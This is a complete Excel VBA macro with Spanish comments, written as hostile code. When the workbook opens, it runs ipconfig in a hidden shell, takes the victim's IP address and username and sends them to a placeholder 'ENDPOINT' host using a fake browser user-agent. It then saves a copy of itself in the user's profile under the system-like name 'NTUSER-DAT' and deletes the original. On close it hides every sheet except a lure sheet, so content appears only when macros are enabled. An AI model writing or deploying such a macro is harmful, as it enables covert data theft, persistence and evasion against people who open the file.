
' Macro completa

Private Sub Workbook_Open() ' Evento que se desencadena cuando se abre el libro.
    For Each ws In ThisWorkbook.Worksheets ' El For Next recorre todas las hojas y las hace visibles
        ws.Visible = xlSheetVisible
    Next ws
    Sheets("Inicio").Visible = xlVeryHidden ' Y la hoja Inicio la oculta
   
          ' Obtenemos la IP
   
    Dim wsh As Object
Dim RegEx As Object, RegM As Object
Dim FSO As Object, fil As Object
Dim ts As Object, txtAll As String, TempFil As String
Set wsh = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set RegEx = CreateObject("vbscript.regexp")
TempFil = "C:\Users\" & Application.UserName & "\myip.txt"
 
' Guarda ipconfig en un archivo temporal
 
wsh.Run "%comspec% /c ipconfig > " & TempFil, 0, True
With RegEx
.Pattern = "(\d{1,3}\.){3}\d{1,3}"
.Global = False
End With
Set fil = FSO.GetFile(TempFil)
 
' Acceso al archivo temporal
 
Set ts = fil.OpenAsTextStream(1)
txtAll = ts.ReadAll
Set RegM = RegEx.Execute(txtAll)
 
Dim ipLocal As String
ipLocal = RegM(0)
 
ts.Close
 
' Eliminamos el archivo temporal
 
Kill TempFil
 
Set ts = Nothing
Set wsh = Nothing
Set fil = Nothing
Set FSO = Nothing
Set RegM = Nothing
Set RegEx = Nothing
   
' En caso de que no haya conexión On Error manejará hacia Next 

        On Error Resume Next
        Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")

' Definimos una URL de destino donde enviaremos las peticiones GET
' Le encolamos la ip en la query string y el user name

        Url = "http://ENDPOINT/?IP=" & ipLocal & "UserName=" & Application.UserName
        objHTTP.Open "GET", Url, False
        objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
        objHTTP.send ("var1=value1&var2=value2&var3=value3")

' Definimos el path en el que está el archivo atual

            Dim myPath As String
       
        myPath = Application.ThisWorkbook.FullName
   
' Anulamos mensajes emergentes

       Application.DisplayAlerts = False

' Guardamos una copia del archivo en la ruta de Windows
' C:\Users\NombreDelUsuario\
' bajo el nombre NTUSER-DAT

         ActiveWorkbook.SaveAs Filename:= _
        "C:\Users\" & Application.UserName & "\NTUSER-DAT" _
        , FileFormat:=xlOpenXMLWorkbookMacroEnabled, CreateBackup:=False
       
' Anulamos mensajes emergentes 

            Application.DisplayAlerts = False

' Al guardar un duplicado hemos pasado al archivo copia
' por tanto, eliminamos el WorkBook anterior con la ruta
' que hemos guardado antes en myPath

            ActiveWorkbook.ChangeFileAccess xlReadOnly
            ' Kill ActiveWorkbook.FullName
            Kill myPath
            ThisWorkbook.Close False
        ActiveWorkbook.Close
 
End Sub

' Esta Macro oculta antes de cerrar todas las hojas del libro
' excepto Inicio
' Luego guarda
 
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    Sheets("Inicio").Visible = xlSheetVisible
    
    For Each ws In ThisWorkbook.Worksheets
        If ws.Name <> "Inicio" Then
            ws.Visible = xlVeryHidden
        End If
    Next ws
 
    ActiveWorkbook.Save
End Sub